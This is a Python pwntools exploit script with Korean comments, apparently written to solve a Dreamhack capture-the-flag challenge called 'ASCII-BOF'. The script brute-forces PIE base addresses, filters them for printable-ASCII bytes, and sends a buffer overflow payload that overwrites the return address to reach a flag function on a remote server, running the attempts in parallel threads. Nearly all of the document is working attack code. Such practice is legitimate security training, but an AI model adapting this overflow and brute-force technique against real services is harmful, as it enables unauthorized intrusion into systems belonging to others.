#!/usr/bin/env python3

"""
ASCII-BOF PIE 베이스 브루트포스
"""

from pwn import *
import time
import threading
from concurrent.futures import ThreadPoolExecutor

def test_pie_base(base_info):
    """단일 PIE 베이스 테스트"""
    base, index = base_info
    HOST = 'host8.dreamhack.games'
    PORT = 12458
    
    flag_offset = 0x1339
    flag_addr = base + flag_offset
    addr_bytes = p64(flag_addr)[:6]
    
    # ASCII 호환성 체크
    if not all(0x20 < b < 0x7f for b in addr_bytes):
        return None
    
    payload = b"A" * 16 + b"B" * 8 + addr_bytes
    
    try:
        r = remote(HOST, PORT, timeout=5)
        r.recvline()
        r.send(payload + b'\n')
        
        response = r.recvall(timeout=3)
        r.close()
        
        result = {
            'index': index,
            'base': base,
            'addr': flag_addr,
            'bytes': addr_bytes.hex(),
            'response': response
        }
        
        if b'DH{' in response:
            result['success'] = True
            flag_match = re.search(rb'DH\{[^}]+\}', response)
            if flag_match:
                result['flag'] = flag_match.group(0).decode()
        else:
            result['success'] = False
        
        return result
        
    except Exception as e:
        return None

def generate_pie_bases():
    """다양한 PIE 베이스 생성"""
    bases = []
    
    # 1. 일반적인 0x555555554000 시리즈
    for i in range(0x4000, 0x10000, 0x1000):
        bases.append(0x555555550000 + i)
    
    # 2. 0x564 시리즈
    for i in range(0x000000, 0x010000, 0x1000):
        bases.append(0x564000000000 + i)
    
    # 3. 0x7f 시리즈 (높은 주소)
    for i in range(0x0000, 0x1000, 0x100):
        base = 0x7f0000000000 + i * 0x100000
        if base <= 0x7fffffffffff:  # 64비트 한계
            bases.append(base)
    
    # 4. 0x400000 시리즈 (고정 주소 스타일)
    for i in range(0x0000, 0x10000, 0x1000):
        bases.append(0x400000 + i)
    
    # 5. 다른 0x55 변형들
    for prefix in [0x55, 0x56, 0x57]:
        for mid in range(0x40, 0x60):
            for low in range(0x0000, 0x8000, 0x1000):
                base = (prefix << 40) | (mid << 32) | (0x55 << 24) | (0x55 << 16) | (0x55 << 8) | 0x00
                base += low
                bases.append(base)
    
    return list(set(bases))  # 중복 제거

def ascii_compatible_filter(bases):
    """ASCII 호환 가능한 베이스들만 필터링"""
    compatible = []
    flag_offset = 0x1339
    
    print(f"[+] {len(bases)}개 베이스 중 ASCII 호환 필터링...")
    
    for base in bases:
        flag_addr = base + flag_offset
        addr_bytes = p64(flag_addr)[:6]
        
        if all(0x20 < b < 0x7f for b in addr_bytes):
            compatible.append(base)
    
    print(f"[+] ASCII 호환 베이스: {len(compatible)}개")
    return compatible

def parallel_brute_force():
    """병렬 브루트포스"""
    print("[+] PIE 베이스 브루트포스 시작")
    print("=" * 50)
    
    # PIE 베이스 생성 및 필터링
    all_bases = generate_pie_bases()
    ascii_bases = ascii_compatible_filter(all_bases)
    
    if not ascii_bases:
        print("❌ ASCII 호환 베이스가 없습니다")
        return None
    
    print(f"[+] 테스트할 베이스: {len(ascii_bases)}개")
    
    # 베이스를 (base, index) 튜플로 변환
    base_infos = [(base, i) for i, base in enumerate(ascii_bases)]
    
    success_results = []
    total_tested = 0
    
    # 병렬 실행 (최대 5개 스레드)
    with ThreadPoolExecutor(max_workers=5) as executor:
        # 배치 단위로 처리 (서버 부하 방지)
        batch_size = 20
        
        for i in range(0, len(base_infos), batch_size):
            batch = base_infos[i:i+batch_size]
            
            print(f"\n[+] 배치 {i//batch_size + 1}: {len(batch)}개 베이스 테스트 중...")
            
            # 배치 실행
            results = list(executor.map(test_pie_base, batch))
            
            # 결과 처리
            for result in results:
                if result is None:
                    continue
                
                total_tested += 1
                
                if result.get('success'):
                    success_results.append(result)
                    print(f"🎉 성공! 베이스 0x{result['base']:x}")
                    print(f"🏆 플래그: {result.get('flag', 'Unknown')}")
                    return result.get('flag')
                
                # 진행상황 출력
                if total_tested % 10 == 0:
                    print(f"   진행: {total_tested}/{len(ascii_bases)} ({total_tested/len(ascii_bases)*100:.1f}%)")
            
            # 서버 부하 방지를 위한 대기
            time.sleep(0.5)
    
    print(f"\n[+] 총 {total_tested}개 베이스 테스트 완료")
    
    if success_results:
        print(f"🎉 성공한 베이스들:")
        for result in success_results:
            print(f"  - 0x{result['base']:x}: {result.get('flag')}")
        return success_results[0].get('flag')
    else:
        print("😞 성공한 베이스를 찾지 못했습니다")
        return None

def quick_common_bases_test():
    """빠른 일반적인 베이스 테스트"""
    print("[+] 빠른 일반적인 베이스 테스트")
    print("=" * 50)
    
    # 가장 일반적인 PIE 베이스들
    common_bases = [
        # Ubuntu/glibc 일반적인 베이스들
        0x555555554000,
        0x555555555000,
        0x555555556000,  
        0x555555557000,
        0x555555558000,
        # 서버 환경에서 자주 보이는 베이스들
        0x564000000000,
        0x564000001000,
        0x564000002000,
        # 다른 가능한 베이스들
        0x7f4000000000,
        0x7f5000000000,
        0x400000,
        0x401000,
    ]
    
    flag_offset = 0x1339
    
    for base in common_bases:
        flag_addr = base + flag_offset
        addr_bytes = p64(flag_addr)[:6]
        
        # ASCII 호환성 체크
        if not all(0x20 < b < 0x7f for b in addr_bytes):
            print(f"베이스 0x{base:x}: ASCII 비호환 - 건너뜀")
            continue
        
        print(f"\n베이스 0x{base:x} 테스트:")
        print(f"  플래그 주소: 0x{flag_addr:x}")
        print(f"  바이트: {addr_bytes.hex()} ({addr_bytes})")
        
        try:
            r = remote('host8.dreamhack.games', 12458)
            r.recvline()
            
            payload = b"A" * 16 + b"B" * 8 + addr_bytes
            r.send(payload + b'\n')
            
            response = r.recvall(timeout=3)
            print(f"  응답: {response}")
            
            if b'DH{' in response:
                print(f"🎉 성공! PIE 베이스: 0x{base:x}")
                flag_match = re.search(rb'DH\{[^}]+\}', response)
                if flag_match:
                    flag = flag_match.group(0).decode()
                    print(f"🏆 플래그: {flag}")
                    return flag
            
            r.close()
            
        except Exception as e:
            print(f"  오류: {e}")
    
    return None

if __name__ == "__main__":
    import re
    
    print("🔥 ASCII-BOF PIE 베이스 브루트포스")
    print("=" * 60)
    
    # 1. 먼저 일반적인 베이스들 빠르게 테스트
    flag = quick_common_bases_test()
    
    if not flag:
        # 2. 실패하면 대규모 브루트포스
        print("\n일반적인 베이스 실패 - 대규모 브루트포스 시작")
        flag = parallel_brute_force()
    
    if flag:
        print(f"\n🎉🎉🎉 최종 성공!")
        print(f"🏆 ASCII-BOF 플래그: {flag}")
    else:
        print("\n😞 모든 시도 실패")
        print("추가 분석이 필요할 수 있습니다.")
